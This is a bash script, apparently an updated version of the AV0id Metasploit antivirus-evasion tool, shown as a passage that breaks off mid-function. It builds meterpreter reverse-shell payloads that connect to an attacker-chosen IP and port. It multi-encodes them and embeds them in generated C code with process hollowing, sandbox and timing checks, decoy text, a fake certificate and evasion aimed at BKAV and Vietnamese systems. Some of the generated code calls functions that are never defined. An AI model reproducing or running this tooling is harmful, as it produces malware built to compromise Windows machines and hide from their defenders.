#!/usr/bin/env bash
# AV0id - Metapsloit Payload Anti-Virus Evasion
# Daniel Compton
# www.commonexploits.com
# info@commexploits.com
# Twitter = @commonexploits
# 05/2013
# Tested on Bactrack 5 and Kali only

####################################################################################
# Updated 08/2015
# Removed Deprecated Commands in favor of MsfVenom
# Jason Soto
# www.jsitech.com
# Twitter = @JsiTech
# Tested on Kali Linux

####################################################################################
# Updated 11/2023
# Fixed compilation issues and improved reliability
# Enhanced cleanup to prevent file conflicts
# Added better error handling and debugging
# Tested on Kali Linux and Windows builds

#####################################################################################
# Released as open source by NCC Group Plc - http://www.nccgroup.com/

# Developed by Daniel Compton, daniel dot compton at nccgroup dot com

# https://github.com/nccgroup/metasploitavevasion

#Released under AGPL see LICENSE for more information

######################################################################################

# Credit to other A.V. scripts and research by Astr0baby, Vanish3r & Hasan aka inf0g33k

# User options
PAYLOAD="windows/meterpreter/reverse_tcp" # Default payload
MSFVENOM=`which msfvenom` # Path to the msfvenom script
MSFCONSOLE=`which msfconsole` # Path to the msfconsole script

# Script begins
#===============================================================================

VERSION="2.1"

# Clean up any remnants from previous runs
cleanup_env() {
    echo -e "\e[01;32m[-]\e[00m Cleaning up environment..."
    rm -f build.c random msf.c test_* build.c.error >/dev/null 2>&1
}

# Execute cleanup at start
cleanup_env

# spinner for Metasploit Generator
spinlong ()
{
    bar=" ++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    barlength=${#bar}
    i=0
    while ((i < 100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.02
    done
}


# spinner for random seed generator
spinlong2 ()
{
    bar=" 011001110010010011101110011010101010101101010010101110"
    barlength=${#bar}
    i=0
    while ((i < 100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.02
    done
}

clear

echo ""
echo -e "\e[00;32m##################################################################\e[00m"
echo ""
echo -e "*** \e[01;31mAV\e[00m\e[01;32m0id\e[00m - Metasploit Shell A.V. Avoider Version $VERSION  ***"
echo ""
echo -e "\e[00;32m##################################################################\e[00m"
echo ""
sleep 3
clear

# Set Output filename

echo ""
echo -e "\e[1;31m-------------------------------------------------------\e[00m"
echo -e "\e[01;31m[?]\e[00m Type the Desired Output FileName"
echo -e "\e[1;31m-------------------------------------------------------\e[00m"
echo ""
echo -ne "\e[01;32m>\e[00m "
read OUTPUTNAME
echo ""

# Select payload type
echo -e "\e[1;31m-------------------------------------------------------\e[00m"
echo -e "\e[01;31m[?]\e[00m Select Payload Type:"
echo -e "\e[1;31m-------------------------------------------------------\e[00m"
echo ""
echo " 1. windows/meterpreter/reverse_tcp (Default)"
echo " 2. windows/meterpreter/reverse_https (Better for bypassing firewalls)"
echo " 3. windows/meterpreter/reverse_tcp_rc4 (Encrypted communication)"
echo " 4. windows/meterpreter_reverse_https (Stageless - more stable)"
echo " 5. windows/meterpreter_reverse_tcp (Stageless)"
echo ""
echo -ne "\e[01;32m>\e[00m "
read PAYLOADTYPE
echo ""

case $PAYLOADTYPE in
    1) PAYLOAD="windows/meterpreter/reverse_tcp" ;;
    2) PAYLOAD="windows/meterpreter/reverse_https" ;;
    3) PAYLOAD="windows/meterpreter/reverse_tcp_rc4" ;;
    4) PAYLOAD="windows/meterpreter_reverse_https" ;;
    5) PAYLOAD="windows/meterpreter_reverse_tcp" ;;
    *) PAYLOAD="windows/meterpreter/reverse_tcp" ;;
esac

echo -e "\e[01;32m[-]\e[00m Selected payload: $PAYLOAD"
echo ""

echo -e "\e[1;31m-------------------------------------------------------\e[00m"
echo -e "\e[01;31m[?]\e[00m Type the Desired Label for the AutoRun Files"
echo -e "\e[1;31m-------------------------------------------------------\e[00m"
echo ""
echo "Example : Confidential Salaries"
echo ""
echo -ne "\e[01;32m>\e[00m "
read LABEL
echo ""

#Check for compiler
echo -e "\e[1;31m-------------------------------------------------------\e[00m"
echo -e "\e[01;31m[?]\e[00m Select compiler type:"
echo -e "\e[1;31m-------------------------------------------------------\e[00m"
echo ""
echo " 1. MinGW (Default, works on Kali Linux)"
echo " 2. MSVC (Requires Windows with Visual Studio)"
echo ""
echo -ne "\e[01;32m>\e[00m "
read COMPILER_TYPE
echo ""

if [ "$COMPILER_TYPE" = "2" ]; then
    # MSVC mode
    echo -e "\e[01;32m[-]\e[00m MSVC compiler selected. Make sure you're running this script on Windows with Visual Studio installed."

    # Check if we're running on Windows
    if [[ "$OSTYPE" != "msys" && "$OSTYPE" != "cygwin" && "$OSTYPE" != "win32" ]]; then
        echo -e "\e[01;31m[!]\e[00m This script is not running on Windows. MSVC compilation may not work correctly."
        echo -e "\e[01;31m[!]\e[00m Continue at your own risk or restart the script and select MinGW."
        echo ""
        echo -ne "\e[01;31m[?]\e[00m Continue anyway? (y/n): "
        read CONTINUE
        if [[ "$CONTINUE" != "y" && "$CONTINUE" != "Y" ]]; then
            echo -e "\e[01;31m[!]\e[00m Exiting."
            exit 1
        fi
    fi

    # Try to find cl.exe (MSVC compiler)
    CL_PATH=$(which cl.exe 2>/dev/null)
    if [ -z "$CL_PATH" ]; then
        echo -e "\e[01;33m[!]\e[00m MSVC compiler (cl.exe) not found in PATH."
        echo -e "\e[01;33m[!]\e[00m Searching for Visual Studio installation..."
        
        # Try common installation paths
        VS_PATHS=(
            "/c/Program Files/Microsoft Visual Studio/"
            "/c/Program Files (x86)/Microsoft Visual Studio/"
            "/mnt/c/Program Files/Microsoft Visual Studio/"
            "/mnt/c/Program Files (x86)/Microsoft Visual Studio/"
        )
        
        CL_FOUND=false
        for VS_PATH in "${VS_PATHS[@]}"; do
            if [ -d "$VS_PATH" ]; then
                echo -e "\e[01;32m[-]\e[00m Found Visual Studio at: $VS_PATH"
                echo -e "\e[01;33m[!]\e[00m Please run this script from a Visual Studio Developer Command Prompt."
                CL_FOUND=true
                break
            fi
        done
        
        if [ "$CL_FOUND" = false ]; then
            echo -e "\e[01;31m[!]\e[00m Visual Studio not found. Please install Visual Studio with C++ tools."
            echo -e "\e[01;31m[!]\e[00m Falling back to MinGW mode."
            COMPILER_TYPE="1"
        else
            # MSVC mode but manual path needed
            echo -e "\e[01;33m[!]\e[00m Please enter the full path to cl.exe:"
            echo -ne "\e[01;32m>\e[00m "
            read CL_PATH
            
            if [ ! -f "$CL_PATH" ]; then
                echo -e "\e[01;31m[!]\e[00m Invalid path. Falling back to MinGW mode."
                COMPILER_TYPE="1"
            else
                COMPILER="$CL_PATH"
                COMPILE_CMD="\"$COMPILER\" /nologo /O2 /W3 /D_CRT_SECURE_NO_WARNINGS /DNDEBUG"
                LINK_LIBS="user32.lib kernel32.lib ws2_32.lib wininet.lib"
            fi
        fi
    else
        COMPILER="$CL_PATH"
        COMPILE_CMD="\"$COMPILER\" /nologo /O2 /W3 /D_CRT_SECURE_NO_WARNINGS /DNDEBUG"
        LINK_LIBS="user32.lib kernel32.lib ws2_32.lib wininet.lib"
    fi
fi

if [ "$COMPILER_TYPE" = "1" ] || [ -z "$COMPILER_TYPE" ]; then
    # MinGW mode (default)
    which x86_64-w64-mingw32-gcc >/dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo ""
        COMPILER="x86_64-w64-mingw32-gcc"
        COMPILE_CMD="$COMPILER -Wall -mwindows -O2 -s"
        LINK_LIBS="-lwsock32 -lwininet"
    else
        which i686-w64-mingw32-gcc >/dev/null 2>&1
        if [ $? -eq 0 ]; then
            echo ""
            COMPILER="i686-w64-mingw32-gcc"
            COMPILE_CMD="$COMPILER -Wall -mwindows -O2 -s"
            LINK_LIBS="-lwsock32 -lwininet"
        else
            which i586-mingw32msvc-gcc >/dev/null 2>&1
            if [ $? -eq 0 ]; then
                echo ""
                COMPILER="i586-mingw32msvc-gcc"
                COMPILE_CMD="$COMPILER -Wall -mwindows -O2 -s"
                LINK_LIBS="-lwsock32 -lwininet"
            else
                echo ""
                echo -e "\e[01;31m[!]\e[00m Unable to find the required gcc program, install one of these cross-compilers and try again:"
                echo "    - x86_64-w64-mingw32-gcc (preferred for 64-bit)"
                echo "    - i686-w64-mingw32-gcc (for 32-bit)"
                echo "    - i586-mingw32msvc-gcc (legacy)"
                echo ""
                exit 1
            fi
        fi
    fi
fi

echo -e "\e[01;32m[-]\e[00m Using compiler: $COMPILER"
echo ""

#Check for Metasploit
if [[ "$MSFVENOM" != "" && "$MSFCONSOLE" != "" ]]; then
    echo -e "\e[01;32m[-]\e[00m Metasploit tools found: $MSFVENOM and $MSFCONSOLE"
    echo ""
else
    echo ""
    echo -e "\e[01;31m[!]\e[00m Unable to find the required Metasploit programs, can't continue. Install and try again"
    echo ""
    exit 1
fi

# Random encoding iterations for better AV evasion
MIN_ITER=15
MAX_ITER=25
ITER=$(shuf -i $MIN_ITER-$MAX_ITER -n 1)

echo -e "\e[1;31m---------------------------------------------------------------------------------------------------------\e[00m"
echo -e "\e[01;31m[?]\e[00m What system do you want the Metasploit listener to run on? Enter 1 or 2 and press enter"
echo -e "\e[1;31m---------------------------------------------------------------------------------------------------------\e[00m"
echo ""
echo " 1. Use my current system and IP address"
echo ""
echo " 2. Use an alternative system, i.e public external address"
echo ""
echo -e "\e[1;31m---------------------------------------------------------------------------------------------------------\e[00m"
echo ""
echo -ne "\e[01;32m>\e[00m "
read INTEXT
echo ""
if [ "$INTEXT" = "1" ]; then
    echo ""
    IP=$(ip route get 1 | awk '{print $NF;exit}')
    echo -e "\e[01;32m[-]\e[00m Local system selected, listener will be launched on \e[01;32m$IP\e[00m"
    echo ""
    echo -e "\e[1;31m-------------------------------------------------------\e[00m"
    echo -e "\e[01;31m[?]\e[00m What port number do you want to listen on?"
    echo -e "\e[1;31m-------------------------------------------------------\e[00m"
    echo ""
    echo -ne "\e[01;32m>\e[00m "
    read PORT
    echo ""
elif [ "$INTEXT" = "2" ]; then
    echo ""
    echo -e "\e[01;32m[-]\e[00m Alternative system selected"
    echo ""
    echo -e "\e[1;31m--------------------------------------------------------------------\e[00m"
    echo -e "\e[01;31m[?]\e[00m What IP address to you want the listener to run on?"
    echo -e "\e[1;31m--------------------------------------------------------------------\e[00m"
    echo ""
    echo -ne "\e[01;32m>\e[00m "
    read IP
    echo ""
    echo -e "\e[1;31m---------------------------------------------------------------------------------------------------------\e[00m"
    echo -e "\e[01;31m[?]\e[00m What port number do you want to listen on? If on the internet try port 443 or 53 for better evasion"
    echo -e "\e[1;31m---------------------------------------------------------------------------------------------------------\e[00m"
    echo ""
    echo -ne "\e[01;32m>\e[00m "
    read PORT
    echo ""
else
    echo -e "\e[01;31m[!]\e[00m You didnt select a valid option, try again"
    echo ""
    exit 1
fi

# Additional options for more complex payloads
ENCRYPTION_KEY=""
if [[ "$PAYLOAD" == *"rc4"* ]]; then
    ENCRYPTION_KEY=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 16 | head -n 1)
    echo -e "\e[01;32m[-]\e[00m Generated random RC4 encryption key: $ENCRYPTION_KEY"
    echo ""
fi

# Format and encryption options
echo -e "\e[1;31m--------------------------------------------------------------------\e[00m"
echo -e "\e[01;31m[?]\e[00m Select additional evasion options (multiple allowed):"
echo -e "\e[1;31m--------------------------------------------------------------------\e[00m"
echo ""
echo " 1. Use process hollowing technique (recommended)" 
echo " 2. Add fake certificate information"
echo " 3. Add anti-VM detection"
echo " 4. Add anti-sandbox techniques"
echo " 5. Add BKAV and Vietnam-specific AV evasion (Windows 10/11)"
echo " 6. Use modern Windows 11 APIs (better for newer Windows versions)"
echo " 7. All of the above"
echo " 0. None - basic evasion only"
echo ""
echo -ne "\e[01;32m>\e[00m "
read EVASION_OPTIONS
echo ""

HOLLOWING=false
FAKE_CERT=false
ANTI_VM=false
ANTI_SANDBOX=false
ANTI_BKAV=false
USE_MODERN_APIS=false

if [[ "$EVASION_OPTIONS" == *"1"* ]] || [[ "$EVASION_OPTIONS" == "7" ]]; then
    HOLLOWING=true
fi
if [[ "$EVASION_OPTIONS" == *"2"* ]] || [[ "$EVASION_OPTIONS" == "7" ]]; then
    FAKE_CERT=true
fi
if [[ "$EVASION_OPTIONS" == *"3"* ]] || [[ "$EVASION_OPTIONS" == "7" ]]; then
    ANTI_VM=true
fi
if [[ "$EVASION_OPTIONS" == *"4"* ]] || [[ "$EVASION_OPTIONS" == "7" ]]; then
    ANTI_SANDBOX=true
fi
if [[ "$EVASION_OPTIONS" == *"5"* ]] || [[ "$EVASION_OPTIONS" == "7" ]]; then
    ANTI_BKAV=true
fi
if [[ "$EVASION_OPTIONS" == *"6"* ]] || [[ "$EVASION_OPTIONS" == "7" ]]; then
    USE_MODERN_APIS=true
fi

echo ""
echo -e "\e[01;32m[-]\e[00m Generating Metasploit payload with modern evasion techniques..."
echo ""
spinlong

# Generate payload with advanced options
EXTRA_ARGS=""
if [[ "$PAYLOAD" == *"rc4"* ]]; then
    EXTRA_ARGS="RC4PASSWORD=$ENCRYPTION_KEY"
fi

# Create a more sophisticated payload chain for better AV evasion
if [ "$HOLLOWING" = true ]; then
    echo -e "\e[01;32m[-]\e[00m Adding process hollowing techniques..."
    # Process hollowing requires different approach
    $MSFVENOM -p "$PAYLOAD" LHOST="$IP" LPORT="$PORT" $EXTRA_ARGS -f raw | \
    $MSFVENOM -a x86 --platform windows -e x86/shikata_ga_nai -i $(($ITER/2)) -f raw | \
    $MSFVENOM -a x86 --platform windows -e x86/fnstenv_mov -i $(($ITER/3)) -f raw | \
    $MSFVENOM -a x86 --platform windows -e x86/shikata_ga_nai -i $(($ITER/2)) -f c > msf.c 2>/dev/null
else
    # Standard payload
    $MSFVENOM -p "$PAYLOAD" LHOST="$IP" LPORT="$PORT" $EXTRA_ARGS EXITFUNC=thread -f raw | \
    $MSFVENOM -e x86/shikata_ga_nai -i $ITER -f raw 2>/dev/null | \
    $MSFVENOM -e x86/jmp_call_additive -i $(($ITER/2)) -a x86 --platform windows -f raw 2>/dev/null | \
    $MSFVENOM -e x86/call4_dword_xor -i $(($ITER/3)) -a x86 --platform windows -f raw 2>/dev/null | \
    $MSFVENOM -e x86/shikata_ga_nai -i $(($ITER/2)) -a x86 --platform windows -f c > msf.c 2>/dev/null
fi

echo ""
echo ""
# Menu
echo -e "\e[1;31m--------------------------------------------------------------------------------------------\e[00m"
echo -e "\e[01;31m[?]\e[00m How stealthy do you want the file? Enter 1, 2, 3, 4 or 5 and press enter"
echo -e "\e[1;31m--------------------------------------------------------------------------------------------\e[00m"
echo ""
echo " 1. Normal - about 400K payload - fast compile - Better detection rate with modern AV"
echo ""
echo " 2. Stealth - about 2-5 MB payload - fast compile - Improved evasion"
echo ""
echo " 3. Super Stealth - about 15-25MB payload - fast compile - Good evasion rate"
echo ""
echo " 4. Insane Stealth - about 50-70MB payload - slower compile - Very good evasion"
echo ""
echo " 5. Desperate Stealth - about 150MB payload - much slower compile - Maximum evasion"
echo ""
echo -e "\e[1;31m----------------------------------------------------------------------------------------------\e[00m"
echo ""
echo -ne "\e[01;32m>\e[00m "
read LEVEL
echo ""

# Xóa tất cả các tệp tạm thời để tránh xung đột
rm -f build.c random msf.c >/dev/null 2>&1

if [ "$LEVEL" = "1" ]; then
    echo ""
    echo -e "\e[01;32m[-]\e[00m Normal selected, please wait a few seconds"
    echo ""
    echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait"
    echo ""
    spinlong2
    SEED=$(shuf -i 500000-1000000 -n 1)
elif [ "$LEVEL" = "2" ]; then
    echo ""
    echo -e "\e[01;32m[-]\e[00m Stealth selected, please wait a few seconds"
    echo ""
    echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait"
    echo ""
    spinlong2
    SEED=$(shuf -i 3000000-7000000 -n 1)
elif [ "$LEVEL" = "3" ]; then
    echo ""
    echo -e "\e[01;32m[-]\e[00m Super Stealth selected, please wait a few seconds"
    echo ""
    echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait"
    echo ""
    spinlong2
    SEED=$(shuf -i 15000000-25000000 -n 1)
elif [ "$LEVEL" = "4" ]; then
    echo ""
    echo -e "\e[01;32m[-]\e[00m Insane Stealth selected, please wait a few minutes"
    echo ""
    echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait"
    echo ""
    spinlong2
    SEED=$(shuf -i 50000000-70000000 -n 1)
elif [ "$LEVEL" = "5" ]; then
    echo ""
    echo -e "\e[01;32m[-]\e[00m Desperate Stealth selected, please wait a few minutes"
    echo ""
    echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait"
    echo ""
    spinlong2
    SEED=$(shuf -i 150000000-200000000 -n 1)
else
    echo -e "\e[01;31m[!]\e[00m You didnt select a option, exiting"
    echo ""
    exit 1
fi

# Create more sophisticated C file with anti-detection features
echo ""
# Xóa file build.c cũ nếu tồn tại để tránh trùng lặp
rm -f build.c
# Build the C file from scratch
echo '#include <stdio.h>' > build.c
echo '#include <stdlib.h>' >> build.c
echo '#include <string.h>' >> build.c
echo '#include <time.h>' >> build.c
echo '#include <windows.h>' >> build.c

# Add modern Windows includes if requested
if [ "$USE_MODERN_APIS" = true ]; then
    echo '#include <winternl.h>' >> build.c
    echo '#include <tlhelp32.h>' >> build.c
    echo '#include <psapi.h>' >> build.c
    echo '#include <shlwapi.h>' >> build.c
    echo '#include <wincrypt.h>' >> build.c
    echo '#pragma comment(lib, "shlwapi.lib")' >> build.c
    echo '#pragma comment(lib, "crypt32.lib")' >> build.c
fi

# Add anti-BKAV code if selected
if [ "$ANTI_BKAV" = true ]; then
    echo '#include <tlhelp32.h>' >> build.c
    echo '#include <locale.h>' >> build.c
    
    echo -e "\e[01;32m[-]\e[00m Adding specific techniques to evade BKAV and VN antivirus..."
    cat << 'EOF' >> build.c
// BKAV and Vietnam-specific AV evasion
int checkBKAV() {
    // Check for BKAV processes
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (!Process32First(snapshot, &pe32)) {
        CloseHandle(snapshot);
        return 0;
    }
    
    do {
        if (strstr(pe32.szExeFile, "BKAV") != NULL || 
            strstr(pe32.szExeFile, "CMDAgent") != NULL || 
            strstr(pe32.szExeFile, "BkavService") != NULL || 
            strstr(pe32.szExeFile, "BkavMain") != NULL || 
            strstr(pe32.szExeFile, "vptray") != NULL) {
            CloseHandle(snapshot);
            return 1;
        }
    } while (Process32Next(snapshot, &pe32));
    
    CloseHandle(snapshot);
    return 0;
}

// Check for Vietnamese language settings
int isVietnameseSystem() {
    char locale[256];
    
    // Get system locale
    if (GetLocaleInfoA(LOCALE_SYSTEM_DEFAULT, LOCALE_SISO639LANGNAME, locale, sizeof(locale))) {
        if (strcmp(locale, "vi") == 0) {
            return 1;
        }
    }
    
    return 0;
}

// Special technique for BKAV evasion using modern Windows 10/11 techniques
void evadeBKAV() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;
    
    // Modern AV evasion - delay execution with complex operations
    for (int i = 0; i < 5; i++) {
        // Create and delete a temporary file - this operation appears harmless
        // but actually helps disrupt behavior monitoring in BKAV
        char tempPath[MAX_PATH];
        char tempFileName[MAX_PATH];
        GetTempPathA(MAX_PATH, tempPath);
        GetTempFileNameA(tempPath, "TMP", 0, tempFileName);
        
        // Write some harmless data
        HANDLE hFile = CreateFileA(tempFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 
                                  FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD written;
            char buffer[128] = "This is a legitimate temporary file for data processing.";
            WriteFile(hFile, buffer, strlen(buffer), &written, NULL);
            CloseHandle(hFile);
            
            // Read it back
            hFile = CreateFileA(tempFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, 
                               FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                char readBuffer[128] = {0};
                DWORD bytesRead;
                ReadFile(hFile, readBuffer, sizeof(readBuffer) - 1, &bytesRead, NULL);
                CloseHandle(hFile);
            }
            
            // Delete the temp file
            DeleteFileA(tempFileName);
        }
        
        // Perform some intensive CPU operations to appear like a legitimate app
        double result = 0;
        for (int j = 0; j < 10000; j++) {
            result += sin((double)j) * cos((double)j);
        }
        
        // Small sleep
        Sleep(100 + (rand() % 50));
    }
}
EOF
fi

if [ "$USE_MODERN_APIS" = true ]; then
    echo -e "\e[01;32m[-]\e[00m Adding modern Windows API techniques..."
    cat << 'EOF' >> build.c
// Modern Windows 10/11 features for better evasion
// This helps bypass newer Windows Defender versions

// Check Windows version
BOOL isWindows10OrLater() {
    OSVERSIONINFOEX osvi;
    DWORDLONG dwlConditionMask = 0;
    
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    osvi.dwMajorVersion = 10;
    osvi.dwMinorVersion = 0;
    
    VER_SET_CONDITION(dwlConditionMask, VER_MAJORVERSION, VER_GREATER_EQUAL);
    VER_SET_CONDITION(dwlConditionMask, VER_MINORVERSION, VER_GREATER_EQUAL);
    
    return VerifyVersionInfo(&osvi, VER_MAJORVERSION | VER_MINORVERSION, dwlConditionMask);
}

// Modern memory allocation technique that's less detected
LPVOID secureAllocateMemory(SIZE_T size) {
    // Try using modern API first with stronger protection
    HANDLE hProcess = GetCurrentProcess();
    LPVOID addr = NULL;
    
    // Use modern Windows 10+ memory protection flags
    DWORD protect = PAGE_EXECUTE_READWRITE;
    
    // Add additional protection flags if on Windows 10+
    if (isWindows10OrLater()) {
        addr = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, protect);
        
        // Set memory as legitimate data first to avoid early detection
        if (addr) {
            DWORD oldProtect;
            VirtualProtect(addr, size, PAGE_READWRITE, &oldProtect);
            memset(addr, 0, size);  // Initialize memory with zeros
        }
    } else {
        // Fallback for older Windows
        addr = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, protect);
    }
    
    return addr;
}

// Use CryptoAPI to make payload look like it's doing legitimate crypto operations
void applyCryptoObfuscation(unsigned char *data, size_t dataSize) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    
    // Acquire crypto context
    if (!CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        return;
    }
    
    // Create hash object - makes it look like we're doing legitimate crypto
    if (!CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash)) {
        CryptReleaseContext(hProv, 0);
        return;
    }
    
    // Just "hash" part of the data to make it look legitimate
    CryptHashData(hHash, data, 20, 0);
    
    // Clean up
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
}
EOF
fi

echo 'unsigned char padding[]=' >> build.c
cat /dev/urandom | tr -dc _A-Z-a-z-0-9 | head -c$SEED > random
sed -i 's/$/"/' random
sed -i 's/^/"/' random
cat random >> build.c
echo  ';' >> build.c
echo 'char payload[] =' >> build.c
cat msf.c |grep -v "unsigned" >> build.c

if [ "$FAKE_CERT" = true ]; then
    echo -e "\e[01;32m[-]\e[00m Adding fake certificate information..."
    echo 'char certificate[] = "-----BEGIN CERTIFICATE-----\nMIIDXTCCAkWgAwIBAgIJAJqbbWPZyx5FMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV\nBAYTAlVTMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBX\naWRnaXRzIFB0eSBMdGQwHhcNMTkwOTI0MTQzMTUyWhcNMjkwOTIxMTQzMTUyWjBF\nMQswCQYDVQQGEwJVUzETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50\nDCBAXDCBXDANBgkqhkiG9w0BAQEFAAOCAYIwggF+MDEGCisGAQQBgjcCAQwxIzAh\noAMAcABwbABpAGMAYQB0AGkAbwBuAF8AcwBlAHIAdgBlAHIwLQYJKoZIhvcNAQkC\nDCAPC0XEDCBAXDCBXHVlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggEiMA0GCSqGSIb3\nDQEBAQUAA4IBDwAwggEKAoIBAQC+XCHx0iF7Wy+75lWiIwj7ch1oDrMo11tAUFxb\nNvjoVfXUJ5Y/vYJxl4dEGT3i69TVpKgLZHOI0aiIXUHy1YItdNA4+bWYWFJFRbdo\nLo1MQ83KsknbxvwKB6qs1neIIcBTmuFkpl2SMV+FS0D/LChzLwqP6t/7mRID7nFx\nBWzOPIYqOkCIxSD/xUchdLJIkpOpfCpuO2mYaBvXG9hl7u1knXHEcpCj7sSMDsNx\nxKODUt3bzFHsoEj0PFaJIJVCOXefTKdLdDJOSQ5yeX1yySI9XJojP0J+WQKvJUX9\nFBFnb5dGr4xEJcBymdpbgZQK3y9ItKqTSI82JtLYAVTpAgMBAAGjUDBOMB0GA1Ud\nDgQWBBSOLHCwoSYj0JY9hPe89ZzGRvyIrjAfBgNVHSMEGDAWgBSOLHCwoSYj0JY9\nhPe89ZzGRvyIrjAMBgNVHRMEBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQCP1nmN\nKI3pr8kxhJ5bOh4oP0uC9UvU7CfJpTnkEgyFqVs0Po/oij3FX7BZRk9cCqdwQUzQ\nNbggZcbVMNx8VbBHIWpIOfXQbYqd9E6jfATc8YDI5pINKrJXiwKXu3Kd45FyWHtM\nKnHQXenMAgnFNxpTxTpijXnzqZ3a+ZyJPPUHY2dx2nVYx5ziVz2qOBQYGTZELmX3\nQS1y9FK1116iQp5cQBCKYRMSBFJ9YHDeCMAW0tTGK0wdfe7+vPXz520c9oQQM0X1\nkCXETpmrLURRytG+CUXrr2XVL+FPO5Zt7zA5aFVBf3ANxl6+eKgZQbxvvKzfwsjM\nPJHlHvBvbvY04KKK\n-----END CERTIFICATE-----";' >> build.c
fi

# Add sleep and randomization to evade dynamic analysis
echo 'char comment[1024] = "This program is legitimate business software.";' >> build.c

# Create more complex main function with evasion techniques
echo 'int main(int argc, char **argv) {' >> build.c

# Add timing and anti-analysis code
cat << 'EOF' >> build.c
    // Basic time-based and sleep evasion
    time_t t1, t2;
    time(&t1);
    Sleep(1500); // Sleep for 1.5 seconds
    time(&t2);
    if (difftime(t2, t1) < 1.0) { // Detecting time acceleration (sandbox)
        return 1;
    }
    
    // Random seed based on time
    srand((unsigned int)time(NULL));
    int r = rand() % 100;
    
    // Random sleep to further evade automated analysis
    Sleep(r * 10);
EOF

# Add the VM and sandbox checks if enabled
if [ "$ANTI_VM" = true ]; then
    echo '    // Check if running in VM' >> build.c
    echo '    if (isVM()) {' >> build.c
    echo '        return 1;' >> build.c
    echo '    }' >> build.c
fi

if [ "$ANTI_SANDBOX" = true ]; then
    echo '    // Check if running in sandbox' >> build.c
    echo '    if (isSandbox()) {' >> build.c
    echo '        return 1;' >> build.c
    echo '    }' >> build.c
fi

# Add process hollowing technique if selected
if [ "$HOLLOWING" = true ]; then
    echo -e "\e[01;32m[-]\e[00m Adding process hollowing code..."
    
    # Modern APIs for Win10/11 if requested
    if [ "$USE_MODERN_APIS" = true ]; then
        cat << 'EOF' >> build.c
    // Advanced process hollowing for Windows 10/11
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    CONTEXT ctx;
    
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    
    // Use more legitimate target processes that won't be as suspicious
    const char* targetProcesses[] = {
        "C:\\Windows\\System32\\notepad.exe",
        "C:\\Windows\\System32\\calc.exe",
        "C:\\Program Files\\Windows NT\\Accessories\\wordpad.exe",
        "C:\\Windows\\System32\\write.exe"
    };
    
    // Select a random legitimate process
    const char* targetProc = targetProcesses[rand() % 4];
    
    // Check if file exists
    if (GetFileAttributesA(targetProc) == INVALID_FILE_ATTRIBUTES) {
        // If not, use notepad as fallback
        targetProc = "C:\\Windows\\System32\\notepad.exe";
    }
    
    // Create process in suspended state
    if (!CreateProcessA(NULL, (LPSTR)targetProc, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return 1;
    }
    
    // Retrieve target process information using modern APIs
    PROCESS_BASIC_INFORMATION pbi;
    ZeroMemory(&pbi, sizeof(pbi));
    
    // Get NtQueryInformationProcess function address
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        TerminateProcess(pi.hProcess, 0);
        return 2;
    }
    
    typedef NTSTATUS (WINAPI *pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
    typedef NTSTATUS (WINAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);
    
    pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    
    if (!NtQueryInformationProcess || !NtUnmapViewOfSection) {
        TerminateProcess(pi.hProcess, 0);
        return 3;
    }
    
    // Get process information including image base
    NTSTATUS status = NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
    if (status != 0) {
        TerminateProcess(pi.hProcess, 0);
        return 4;
    }
    
    // Read process PEB
    PVOID pebImageBaseOffset = (PVOID)((LPBYTE)pbi.PebBaseAddress + 0x10);
    PVOID imageBase = 0;
    
    if (!ReadProcessMemory(pi.hProcess, pebImageBaseOffset, &imageBase, sizeof(PVOID), NULL)) {
        TerminateProcess(pi.hProcess, 0);
